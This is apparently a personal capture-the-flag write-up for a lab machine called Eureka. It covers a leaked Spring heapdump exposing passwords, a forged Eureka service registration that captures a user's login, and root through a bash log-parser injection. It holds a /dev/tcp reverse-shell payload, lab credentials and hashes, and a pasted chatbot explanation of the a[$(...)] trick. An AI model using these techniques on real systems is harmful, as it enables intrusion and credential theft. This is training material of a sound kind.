---
os:
status:
tags:
  - heapdump
  - java
  - enumeration
  - microservices
  - log_poisoning
  - command_injection
aliases:
---
# Resolution summary

>[!summary]
>- Step 1
>- Step 2

## Improved skills

- Skill 1
- Skill 2

## Used tools

- nmap
- gobuster



# Information Gathering

Scanned all TCP ports:

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)
|   256 90:11:9d:67:b6:f6:64:d4:df:7f:ed:4a:90:2e:6d:7b (ECDSA)
|_  256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://furni.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Enumerated pages:

```sh
login                   [Status: 200, Size: 1550, Words: 195, Lines: 28, Duration: 2369ms]
                        [Status: 200, Size: 18854, Words: 1039, Lines: 550, Duration: 2454ms]
blog                    [Status: 200, Size: 13568, Words: 690, Lines: 399, Duration: 2518ms]
about                   [Status: 200, Size: 14351, Words: 772, Lines: 450, Duration: 2511ms]
contact                 [Status: 200, Size: 10738, Words: 578, Lines: 304, Duration: 2518ms]
services                [Status: 200, Size: 14173, Words: 774, Lines: 433, Duration: 2492ms]
register                [Status: 200, Size: 9028, Words: 1358, Lines: 255, Duration: 2629ms]
shop                    [Status: 200, Size: 12412, Words: 608, Lines: 353, Duration: 1391ms]
comment                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 262ms]
cart                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 227ms]
logout                  [Status: 200, Size: 1159, Words: 117, Lines: 21, Duration: 1348ms]
checkout                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1722ms]
error                   [Status: 500, Size: 73, Words: 1, Lines: 1, Duration: 179ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

```


Changing the word list, I have used dirsearch tool And its built in word list. And we found misconfiguration that lead us to see `/actuator` folder.
/var/www/web/Furni/src/main/resources/application.properties
```
[19:04:24] 200 -   20B  - /actuator/caches       
[19:04:24] 200 -    2B  - /actuator/info
[19:04:24] 200 -    6KB - /actuator/env
[19:04:24] 200 -   15B  - /actuator/health       
[19:04:24] 200 -  467B  - /actuator/features
[19:04:24] 200 -   54B  - /actuator/scheduledtasks
[19:04:24] 200 -    3KB - /actuator/metrics      
[19:04:24] 200 -   35KB - /actuator/mappings     
[19:04:24] 200 -   36KB - /actuator/configprops  
[19:04:25] 200 -  180KB - /actuator/conditions   
[19:04:25] 200 -  198KB - /actuator/beans
[19:04:25] 200 -   99KB - /actuator/loggers      
[19:04:25] 200 -  130KB - /actuator/threaddump   
[19:04:33] 200 -   76MB - /actuator/heapdump
```

---

# Enumeration

## Port 80 - HTTP (Apache)

```sh
java -jar ~/.opt/java/JDumpSpider/JDumpSpider-1.1-SNAPSHOT-full.jar heapdump   

password = 0sc@r190_S0l!dP@sswd                                  
driverClassName = com.mysql.cj.jdbc.Driver                
url = jdbc:mysql://localhost:3306/Furni_WebApp_DB     
username = oscar190    

OriginTrackedMapPropertySource
-------------                                   
management.endpoints.web.exposure.include = *
spring.datasource.driver-class-name = com.mysql.cj.jdbc.Driver                                   
spring.cloud.inetutils.ignoredInterfaces = enp0s.*                                               
eureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/
server.forward-headers-strategy = native
spring.datasource.url = jdbc:mysql://localhost:3306/Furni_WebApp_DB                              
spring.application.name = Furni
server.port = 8082                              
spring.jpa.properties.hibernate.format_sql = true                                                
spring.session.store-type = jdbc
spring.jpa.hibernate.ddl-auto = none

http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/

```
ssh and you are in.


Start fake server to take steal credentials

```http
POST /eureka/apps/USER-MANAGEMENT-SERVICE HTTP/1.1
Host: localhost:8761
Cache-Control: max-age=0
Authorization: Basic RXVyZWthU3J2cjowc2NhclBXRGlzVGhlQjNzdA==
sec-ch-ua: "Chromium";v="127", "Not)A;Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=8CA13157100A8BAE94458A2A5583D504
Content-Type: application/json
Content-Length: 1378
Connection: keep-alive

{
  "instance": {
    "instanceId": "host.docker.internal:webservice:8081",
    "app": "USER-MANAGEMENT-SERVICE",
    "appGroupName": null,
    "ipAddr": "10.10.16.94",
    "sid": "na",
    "homePageUrl": "http://host.docker.internal:8081/",
    "statusPageUrl": "http://host.docker.internal:8081/actuator/info",
    "healthCheckUrl": "http://host.docker.internal:8081/actuator/health",
    "secureHealthCheckUrl": null,
    "vipAddress": "USER-MANAGEMENT-SERVICE",
    "secureVipAddress": "USER-MANAGEMENT-SERVICE",
    "countryId": 1,
    "dataCenterInfo": {
      "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
      "name": "MyOwn"
    },
    "hostName": "10.10.16.94",
    "status": "UP",
    "overriddenStatus": "UNKNOWN",
    "leaseInfo": {
      "renewalIntervalInSecs": 30,
      "durationInSecs": 90,
      "registrationTimestamp": 0,
      "lastRenewalTimestamp": 0,
      "evictionTimestamp": 0,
      "serviceUpTimestamp": 0
    },
    "isCoordinatingDiscoveryServer": false,
    "lastUpdatedTimestamp": 1630906180645,
    "lastDirtyTimestamp": 1630906182808,
    "actionType": null,
    "asgName": null,
    "port": {
      "$": 4444,
      "@enabled": "true"
    },
    "securePort": {
      "$": 443,
      "@enabled": "false"
    },
    "metadata": {
      "management.port": "8081"
    }
  }
}
```

```http
POST /login HTTP/1.1
X-Real-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1,127.0.0.1
X-Forwarded-Proto: http,http
Content-Length: 168
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: SESSION=ZGEwZjc4NGUtYjg2Ni00NjJiLWJhNTktZjkwYmZhMzdmMzU5
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Forwarded: proto=http;host=furni.htb;for="127.0.0.1:58048"
X-Forwarded-Port: 80
X-Forwarded-Host: furni.htb
host: 10.10.16.94:4444

username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve&_csrf=EN-V0z4G41xZWlRL40WN1r6c9YeqAo0jd2fF3Oh_NDrkVrIJIb724g8_2250OzAo2mi549ur2L7PMbkOQgT35N9JAQzSYIs6


miranda-wise:IL!veT0Be&BeT0L0ve
```

---

# Exploitation

## SQL Injection


---

# Lateral Movement to xxx

## Local enumeration

```sh
oscar190@eureka:~$ netstat -lntp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::8761                 :::*                    LISTEN      -                   
tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 127.0.0.1:8081          :::*                    LISTEN      -                   
tcp6       0      0 127.0.0.1:8082          :::*                    LISTEN      -  
```

```sh
mysql

|  9 | Miranda     | Wise         | miranda.wise@furni.htb  | $2a$10$T4L873JALnbXH10tq.mEbOOVYmZPLlBBSeD1h2hqAeX6nbTDXMyqm |        1 |
| 10 | Oscar       | Dalton       | oscar190@furni.htb      | $2a$10$ye9a40a7KOyBJKUai2qxY.fcfVQGlFTM3SVSVcn82wxQf/2zYPq96 |        1 |
| 11 | Nya         | Dalton       | nya190@furni.htb        | $2a$10$GZQOgzb4N1xVs3ALpnuqGeId5/mZLL8pv5GlkRzJfxdFxO/JIkIaK |        1 |

```

```sh

8081 --> /login /logout 

```

## Lateral movement vector

---

# Privilege Escalation to xxx

## Local enumeration


## Privilege Escalation vector

by looking at results of `pspy64`:
```
2025/08/27 13:10:03 CMD: UID=0     PID=369754 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log 
2025/08/27 13:10:03 CMD: UID=0     PID=369758 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log 
2025/08/27 13:10:03 CMD: UID=0     PID=369757 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log 
2025/08/27 13:10:03 CMD: UID=0     PID=369759 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log 
```


looking at `/opt/log_analyse.sh`:
```sh
#!/bin/bash

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
RESET='\033[0m'

LOG_FILE="$1"
OUTPUT_FILE="log_analysis.txt"

declare -A successful_users  # Associative array: username -> count
declare -A failed_users      # Associative array: username -> count
STATUS_CODES=("200:0" "201:0" "302:0" "400:0" "401:0" "403:0" "404:0" "500:0") # Indexed array: "code:count" pairs

if [ ! -f "$LOG_FILE" ]; then
    echo -e "${RED}Error: Log file $LOG_FILE not found.${RESET}"
    exit 1
fi

analyze_logins() {
    # Process successful logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${successful_users[$username]+_}" ]; then
            successful_users[$username]=$((successful_users[$username] + 1))
        else
            successful_users[$username]=1
        fi
    done < <(grep "LoginSuccessLogger" "$LOG_FILE")

    # Process failed logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${failed_users[$username]+_}" ]; then
            failed_users[$username]=$((failed_users[$username] + 1))
        else
            failed_users[$username]=1
        fi
    done < <(grep "LoginFailureLogger" "$LOG_FILE")
}

analyze_http_statuses() {
    # Process HTTP status codes
    while IFS= read -r line; do
        code=$(echo "$line" | grep -oP 'Status: \K.*')
        found=0
        # Check if code exists in STATUS_CODES array
        for i in "${!STATUS_CODES[@]}"; do
            existing_entry="${STATUS_CODES[$i]}"
            existing_code=$(echo "$existing_entry" | cut -d':' -f1)
            existing_count=$(echo "$existing_entry" | cut -d':' -f2)
            if [[ "$existing_code" -eq "$code" ]]; then
                new_count=$((existing_count + 1))
                STATUS_CODES[$i]="${existing_code}:${new_count}"
                break
            fi
        done
    done < <(grep "HTTP.*Status: " "$LOG_FILE")
}

analyze_log_errors(){
     # Log Level Counts (colored)
    echo -e "\n${YELLOW}[+] Log Level Counts:${RESET}"
    log_levels=$(grep -oP '(?<=Z  )\w+' "$LOG_FILE" | sort | uniq -c)
    echo "$log_levels" | awk -v blue="$BLUE" -v yellow="$YELLOW" -v red="$RED" -v reset="$RESET" '{
        if ($2 == "INFO") color=blue;
        else if ($2 == "WARN") color=yellow;
        else if ($2 == "ERROR") color=red;
        else color=reset;
        printf "%s%6s %s%s\n", color, $1, $2, reset
    }'

    # ERROR Messages
    error_messages=$(grep ' ERROR ' "$LOG_FILE" | awk -F' ERROR ' '{print $2}')
    echo -e "\n${RED}[+] ERROR Messages:${RESET}"
    echo "$error_messages" | awk -v red="$RED" -v reset="$RESET" '{print red $0 reset}'

    # Eureka Errors
    eureka_errors=$(grep 'Connect to http://localhost:8761.*failed: Connection refused' "$LOG_FILE")
    eureka_count=$(echo "$eureka_errors" | wc -l)
    echo -e "\n${YELLOW}[+] Eureka Connection Failures:${RESET}"
    echo -e "${YELLOW}Count: $eureka_count${RESET}"
    echo "$eureka_errors" | tail -n 2 | awk -v yellow="$YELLOW" -v reset="$RESET" '{print yellow $0 reset}'
}

display_results() {
    echo -e "${BLUE}----- Log Analysis Report -----${RESET}"

    # Successful logins
    echo -e "\n${GREEN}[+] Successful Login Counts:${RESET}"
    total_success=0
    for user in "${!successful_users[@]}"; do
        count=${successful_users[$user]}
        printf "${GREEN}%6s %s${RESET}\n" "$count" "$user"
        total_success=$((total_success + count))
    done
    echo -e "${GREEN}\nTotal Successful Logins: $total_success${RESET}"

    # Failed logins
    echo -e "\n${RED}[+] Failed Login Attempts:${RESET}"
    total_failed=0
    for user in "${!failed_users[@]}"; do
        count=${failed_users[$user]}
        printf "${RED}%6s %s${RESET}\n" "$count" "$user"
        total_failed=$((total_failed + count))
    done
    echo -e "${RED}\nTotal Failed Login Attempts: $total_failed${RESET}"

    # HTTP status codes
    echo -e "\n${CYAN}[+] HTTP Status Code Distribution:${RESET}"
    total_requests=0
    # Sort codes numerically
    IFS=$'\n' sorted=($(sort -n -t':' -k1 <<<"${STATUS_CODES[*]}"))
    unset IFS
    for entry in "${sorted[@]}"; do
        code=$(echo "$entry" | cut -d':' -f1)
        count=$(echo "$entry" | cut -d':' -f2)
        total_requests=$((total_requests + count))
        
        # Color coding
        if [[ $code =~ ^2 ]]; then color="$GREEN"
        elif [[ $code =~ ^3 ]]; then color="$YELLOW"
        elif [[ $code =~ ^4 || $code =~ ^5 ]]; then color="$RED"
        else color="$CYAN"
        fi
        
        printf "${color}%6s %s${RESET}\n" "$count" "$code"
    done
    echo -e "${CYAN}\nTotal HTTP Requests Tracked: $total_requests${RESET}"
}

# Main execution
analyze_logins
analyze_http_statuses
display_results | tee "$OUTPUT_FILE"
analyze_log_errors | tee -a "$OUTPUT_FILE"
echo -e "\n${GREEN}Analysis completed. Results saved to $OUTPUT_FILE${RESET}"
```

the vlunrable code snippet is:
```sh
analyze_http_statuses() {
    # Process HTTP status codes
    while IFS= read -r line; do
        code=$(echo "$line" | grep -oP 'Status: \K.*')
        found=0
        # Check if code exists in STATUS_CODES array
        for i in "${!STATUS_CODES[@]}"; do
            existing_entry="${STATUS_CODES[$i]}"
            existing_code=$(echo "$existing_entry" | cut -d':' -f1)
            existing_count=$(echo "$existing_entry" | cut -d':' -f2)
            if [[ "$existing_code" -eq "$code" ]]; then
                new_count=$((existing_count + 1))
                STATUS_CODES[$i]="${existing_code}:${new_count}"
                break
            fi
        done
    done < <(grep "HTTP.*Status: " "$LOG_FILE")
}
```

If we can put things in `$code` as `${id}` it will execute code.

Ahhh I see what you’re asking now 🔥 — you’re talking about **why the attacker’s payload is inside an array index reference `a[...]`** instead of just dropping `$(...)` directly.

Let’s break it down.

---

### 1. The vulnerable line in your script

```bash
if [[ "$existing_code" -eq "$code" ]]; then
```

- `"$code"` comes from:
    
    ```bash
    code=$(echo "$line" | grep -oP 'Status: \K.*')
    ```
    
- So **whatever is after `Status:` in the log file gets stored in `$code`.**
    
- Then `[[ ... -eq ... ]]` forces a **numeric comparison** between `$existing_code` and `$code`.
    
- If `$code` isn’t a number (e.g. contains `$(...)`), bash will still try to interpret it. That’s the injection point.
    

---

### 2. Why they used `a[$(...)]`

If they just injected:

```text
Status: $(bash -i >& /dev/tcp/10.10.16.94/4444 0>&1)
```

Then `"$code"` becomes the whole string with spaces. When Bash evaluates it inside `[[ ... -eq "$code" ]]`, it may throw an **integer expected** error too early or fail parsing.

By wrapping it like this:

```text
Status: a[$(payload)]
```

They’re leveraging **bash array syntax**:

- `a[...]` is valid to bash (like referencing an array index).
    
- Inside the brackets `[...]`, bash will **evaluate command substitution `$(...)` first** before trying to resolve the index.
    
- That makes the payload execute **before** the script even compares integers.
    

So the trick is:  
✅ `a[...]` keeps the string syntactically valid for the `-eq` comparison  
✅ `$(...)` inside executes their command before the failure happens

---

### 3. Why not just `$()` directly?

Because:

- Direct `$(...)` would break parsing in arithmetic context (bash expects a number).
    
- `a[$(...)]` ensures the malicious command executes in a safe evaluation spot before the `-eq` comparison fails.
    

It’s a clever way to **smuggle code execution into a numeric comparison**.

---

👉 In short:  
They didn’t use `$()` directly because Bash arithmetic comparisons are picky about syntax. Wrapping it in `a[...]` ensures the payload evaluates without immediately causing a parse error.

---

Do you want me to show you a **minimal PoC script** you can run locally that reproduces why `a[$(...)]` works but `$(...)` alone doesn’t?



---

# Trophy

{{image}}

>[!todo] **User.txt**
>flag

>[!todo] **Root.txt**
>flag

**/etc/shadow**

```sh

```